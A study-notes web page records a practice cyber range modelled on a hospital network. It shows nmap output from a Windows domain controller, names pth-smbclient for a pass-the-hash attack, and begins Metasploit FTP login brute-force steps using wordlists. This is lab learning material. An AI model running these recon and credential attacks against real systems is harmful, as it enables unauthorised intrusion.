@@ -1,0 +1,1402 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="CyberAntonio.com is Antonio Feijao UK personal website with cyber security study notes. Learning by doing, linux, it security, networking, containers, aws, cloud, pen-testing, and more. Opinions are my own.">
+      
+      
+        <meta name="author" content="Antonio Feijao UK">
+      
+      
+        <link rel="canonical" href="https://www.cyberantonio.com/notes/office-cyber-range-arms-h-notes/">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.1, mkdocs-material-8.5.7">
+    
+    
+      
+        <title>offensive cyber range armsdon-h notes - CyberAntonio.com, Antonio Feijao UK, Cyber Security learning by doing</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.20d9efc8.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#000000">
+        
+      
+      
+
+    
+    
+    
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-orange">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#offensive-cyber-range-armsdon-h-notes" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="CyberAntonio.com, Antonio Feijao UK, Cyber Security learning by doing" class="md-header__button md-logo" aria-label="CyberAntonio.com, Antonio Feijao UK, Cyber Security learning by doing" data-md-component="logo">
+      
+  <img src="/assets/images/background/close-up-of-green-leaves-on-blurred-leaf-background-free-photo.jpeg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CyberAntonio.com, Antonio Feijao UK, Cyber Security learning by doing
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              offensive cyber range armsdon-h notes
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../.." class="md-tabs__link">
+      Home
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../../about/" class="md-tabs__link">
+      About
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../../contact/" class="md-tabs__link">
+      Contact
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../events/" class="md-tabs__link">
+        Events
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../" class="md-tabs__link md-tabs__link--active">
+        Notes
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="CyberAntonio.com, Antonio Feijao UK, Cyber Security learning by doing" class="md-nav__button md-logo" aria-label="CyberAntonio.com, Antonio Feijao UK, Cyber Security learning by doing" data-md-component="logo">
+      
+  <img src="/assets/images/background/close-up-of-green-leaves-on-blurred-leaf-background-free-photo.jpeg" alt="logo">
+
+    </a>
+    CyberAntonio.com, Antonio Feijao UK, Cyber Security learning by doing
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../about/" class="md-nav__link">
+        About
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../contact/" class="md-nav__link">
+        Contact
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../../events/">Events</a>
+          
+            <label for="__nav_4">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Events" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Events
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../events/antonio-azinhaga-digital/" class="md-nav__link">
+        antonio-at-azinhaga-digital
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" checked>
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../">Notes</a>
+          
+            <label for="__nav_5">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Notes" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Notes
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../git-commands/" class="md-nav__link">
+        git commands notes
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../learning-by-doing/" class="md-nav__link">
+        learning by doing
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linux-privilege-escalation/" class="md-nav__link">
+        linux privilege escalation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mkdocs-basic-syntax/" class="md-nav__link">
+        mkdocs-basic-syntax
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          offensive cyber range armsdon-h notes
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        offensive cyber range armsdon-h notes
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#domain-controller" class="md-nav__link">
+    domain controller
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ftp-server" class="md-nav__link">
+    ftp server
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#intranet" class="md-nav__link">
+    intranet
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hashcat" class="md-nav__link">
+    hashcat
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#testing-sqlmap-with-user-authenticantion" class="md-nav__link">
+    testing SQLmap with user authenticantion
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sites-to-follow/" class="md-nav__link">
+        sites to follow
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wordpress-container-sample/" class="md-nav__link">
+        Wordpress container sample
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle="__nav_5_9" type="checkbox" id="__nav_5_9" checked>
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../metasploit/">Metasploit</a>
+          
+            <label for="__nav_5_9">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Metasploit" data-md-level="2">
+        <label class="md-nav__title" for="__nav_5_9">
+          <span class="md-nav__icon md-icon"></span>
+          Metasploit
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploit/04-metasploit%E2%80%93enumeration/" class="md-nav__link">
+        04 metasploit–enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploit/metasploit-basics/" class="md-nav__link">
+        metasploit-basics
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploit/metasploit-discovery/" class="md-nav__link">
+        Metasploit discovery
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploit/metasploit-modules/" class="md-nav__link">
+        Metasploit modules
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploit/psexec-pass-the-hash/" class="md-nav__link">
+        psexec pass the hash
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle="__nav_5_10" type="checkbox" id="__nav_5_10" checked>
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../quotes/">Quotes</a>
+          
+            <label for="__nav_5_10">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Quotes" data-md-level="2">
+        <label class="md-nav__title" for="__nav_5_10">
+          <span class="md-nav__icon md-icon"></span>
+          Quotes
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../quotes/to-think-about-quotes/" class="md-nav__link">
+        quotes to think about
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle="__nav_5_11" type="checkbox" id="__nav_5_11" checked>
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../sqlmap/">Sqlmap</a>
+          
+            <label for="__nav_5_11">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Sqlmap" data-md-level="2">
+        <label class="md-nav__title" for="__nav_5_11">
+          <span class="md-nav__icon md-icon"></span>
+          Sqlmap
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqlmap/sql-union-injection/" class="md-nav__link">
+        sql union injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqlmap/sqlmap-notes/" class="md-nav__link">
+        metasploit
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="offensive-cyber-range-armsdon-h-notes">offensive cyber range armsdon-h notes</h1>
+<h2 id="domain-controller">domain controller</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Host is up <span class="o">(</span><span class="m">0</span>.00056s latency<span class="o">)</span>.
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Not shown: <span class="m">988</span> filtered ports
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>PORT     STATE SERVICE       VERSION
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="m">53</span>/tcp   open  domain?
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="p">|</span> fingerprint-strings: 
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="p">|</span>   DNSVersionBindReqTCP: 
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="p">|</span>     version
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="p">|</span>_    <span class="nb">bind</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="m">88</span>/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: xxxxxx<span class="o">)</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="m">135</span>/tcp  open  msrpc         Microsoft Windows RPC
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="m">139</span>/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="m">389</span>/tcp  open  ldap
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="m">445</span>/tcp  open  microsoft-ds  Windows Server <span class="m">2016</span> Datacenter <span class="m">14393</span> microsoft-ds <span class="o">(</span>workgroup: ARMSDON<span class="o">)</span>
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="m">464</span>/tcp  open  kpasswd5?
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="m">593</span>/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP <span class="m">1</span>.0
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="m">636</span>/tcp  open  tcpwrapped
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="m">3268</span>/tcp open  ldap
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="m">3269</span>/tcp open  tcpwrapped
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="m">3389</span>/tcp open  ms-wbt-server Microsoft Terminal Services
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="p">|</span> rdp-ntlm-info: 
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="p">|</span>   Target_Name: ARMSDON
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="p">|</span>   NetBIOS_Domain_Name: ARMSDON
+<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="p">|</span>   NetBIOS_Computer_Name: EC2AMAZ-DFA8KLR
+<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a><span class="p">|</span>   DNS_Domain_Name: armsdon.hospital.local
+<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a><span class="p">|</span>   DNS_Computer_Name: EC2AMAZ-DFA8KLR.armsdon.hospital.local
+<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a><span class="p">|</span>   Product_Version: <span class="m">10</span>.0.14393
+<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="p">|</span>_  System_Time: <span class="m">2022</span>-08-13T22:47:37+00:00
+<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>EC2AMAZ-DFA8KLR.armsdon.hospital.local
+<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a><span class="p">|</span> Not valid before: <span class="m">2022</span>-08-12T20:54:20
+<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a><span class="p">|</span>_Not valid after:  <span class="m">2023</span>-02-11T20:54:20
+<a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a><span class="p">|</span>_ssl-date: <span class="m">2022</span>-08-13T22:48:17+00:00<span class="p">;</span> 0s from scanner time.
+<a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+<a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>SF-Port53-TCP:V<span class="o">=</span><span class="m">7</span>.80%I<span class="o">=</span><span class="m">7</span>%D<span class="o">=</span><span class="m">8</span>/13%Time<span class="o">=</span>62F82983%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNSV
+<a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>SF:ersionBindReqTCP,20,<span class="s2">&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\</span>
+<a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a><span class="s2">SF:x04bind\0\0\x10\0\x03&quot;</span><span class="o">)</span><span class="p">;</span>                                                                                                                                               
+<a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port                                                                     
+<a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>Device type: general purpose                                                                                                                                              
+<a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: Microsoft Windows <span class="m">2016</span> <span class="o">(</span><span class="m">89</span>%<span class="o">)</span>, FreeBSD <span class="m">6</span>.X <span class="o">(</span><span class="m">85</span>%<span class="o">)</span>                                                                                                  
+<a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a>OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:freebsd:freebsd:6.2                                                                                                   
+<a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a>Aggressive OS guesses: Microsoft Windows Server <span class="m">2016</span> <span class="o">(</span><span class="m">89</span>%<span class="o">)</span>, FreeBSD <span class="m">6</span>.2-RELEASE <span class="o">(</span><span class="m">85</span>%<span class="o">)</span>                                                                                     
+<a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>No exact OS matches <span class="k">for</span> host <span class="o">(</span><span class="nb">test</span> conditions non-ideal<span class="o">)</span>.                                                                                                                 
+<a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>Network Distance: <span class="m">2</span> hops                                                                                                                                                  
+<a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>Service Info: Host: EC2AMAZ-DFA8KLR<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows                                                                                           
+<a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a>
+<a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a>Host script results:                                                                                                                                                      
+<a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a><span class="p">|</span>_clock-skew: mean: 0s, deviation: 2s, median: 0s
+<a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a><span class="p">|</span> smb-os-discovery: 
+<a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a><span class="p">|</span>   OS: Windows Server <span class="m">2016</span> Datacenter <span class="m">14393</span> <span class="o">(</span>Windows Server <span class="m">2016</span> Datacenter <span class="m">6</span>.3<span class="o">)</span>
+<a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a><span class="p">|</span>   Computer name: EC2AMAZ-DFA8KLR
+<a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a><span class="p">|</span>   NetBIOS computer name: EC2AMAZ-DFA8KLR<span class="se">\x</span><span class="m">00</span>
+<a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a><span class="p">|</span>   Domain name: armsdon.hospital.local
+<a id="__codelineno-0-52" name="__codelineno-0-52" href="#__codelineno-0-52"></a><span class="p">|</span>   Forest name: armsdon.hospital.local
+<a id="__codelineno-0-53" name="__codelineno-0-53" href="#__codelineno-0-53"></a><span class="p">|</span>   FQDN: EC2AMAZ-DFA8KLR.armsdon.hospital.local
+<a id="__codelineno-0-54" name="__codelineno-0-54" href="#__codelineno-0-54"></a><span class="p">|</span>_  System time: xxxxxx
+<a id="__codelineno-0-55" name="__codelineno-0-55" href="#__codelineno-0-55"></a><span class="p">|</span> smb-security-mode: 
+<a id="__codelineno-0-56" name="__codelineno-0-56" href="#__codelineno-0-56"></a><span class="p">|</span>   account_used: guest
+<a id="__codelineno-0-57" name="__codelineno-0-57" href="#__codelineno-0-57"></a><span class="p">|</span>   authentication_level: user
+<a id="__codelineno-0-58" name="__codelineno-0-58" href="#__codelineno-0-58"></a><span class="p">|</span>   challenge_response: supported
+<a id="__codelineno-0-59" name="__codelineno-0-59" href="#__codelineno-0-59"></a><span class="p">|</span>_  message_signing: required
+<a id="__codelineno-0-60" name="__codelineno-0-60" href="#__codelineno-0-60"></a><span class="p">|</span> smb2-security-mode: 
+<a id="__codelineno-0-61" name="__codelineno-0-61" href="#__codelineno-0-61"></a><span class="p">|</span>   <span class="m">2</span>.02: 
+<a id="__codelineno-0-62" name="__codelineno-0-62" href="#__codelineno-0-62"></a><span class="p">|</span>_    Message signing enabled and required
+<a id="__codelineno-0-63" name="__codelineno-0-63" href="#__codelineno-0-63"></a><span class="p">|</span> smb2-time: 
+<a id="__codelineno-0-64" name="__codelineno-0-64" href="#__codelineno-0-64"></a><span class="p">|</span>   date: xxxxx
+<a id="__codelineno-0-65" name="__codelineno-0-65" href="#__codelineno-0-65"></a><span class="p">|</span>_  start_date: xxxxx
+</code></pre></div>
+<blockquote>
+<p>Once the hash of the domain administrator has been recovered, which of the following programs can be used to perform a Pass the Hash attack?</p>
+</blockquote>
+<p><code>pth-smbclient</code></p>
+<p>What is <code>pth-smbclient</code>?</p>
+<hr />
+<h2 id="ftp-server">ftp server</h2>
+<p><a href="https://pentestlab.blog/2012/03/01/attacking-the-ftp-service/">https://pentestlab.blog/2012/03/01/attacking-the-ftp-service/</a></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>mfsconsole
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>search ftp_login
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>use auxiliary/scanner/ftp/ftp_login
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>show options
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="nb">set</span> RHOST XXXXX
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>find / <span class="m">2</span>&gt;/dev/null <span class="p">|</span> grep -i wordlist <span class="p">|</span> grep unix
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>/usr/share/metasploit-framework/data/wordlists/unix_users.txt
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>
